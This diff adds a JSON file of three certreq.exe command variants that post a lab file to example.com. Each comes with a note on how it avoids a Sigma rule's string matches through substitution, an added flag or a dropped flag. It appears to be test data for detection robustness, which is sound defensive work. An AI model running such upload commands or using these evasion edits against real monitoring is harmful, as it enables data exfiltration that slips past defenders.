@@ -1,0 +1,14 @@
+[
+  {
+    "output": "certreq.exe -Post -config https://example.com C:\\Lab\\input\\sample.txt C:\\Lab\\out\\archive.7z",
+    "explanation": "Substitution: Replaced the suspicious target path 'C:\\windows\\win.ini' and output path with benign lab placeholders to avoid matching the Sigma rule's suspicious file paths."
+  },
+  {
+    "output": "certreq.exe -Post -config https://example.com C:\\Lab\\input\\sample.txt C:\\Lab\\out\\archive.7z -quiet",
+    "explanation": "Insertion: Added a harmless '-quiet' flag to the command line, which may not be detected by the Sigma rule as it does not contain the suspicious string 'C:\\windows\\win.ini'."
+  },
+  {
+    "output": "certreq.exe -config https://example.com C:\\Lab\\input\\sample.txt C:\\Lab\\out\\archive.7z",
+    "explanation": "Omission: Removed the '-Post' flag, which may not trigger the Sigma rule's ' -Post ' string match, while still maintaining a benign test intent."
+  }
+]
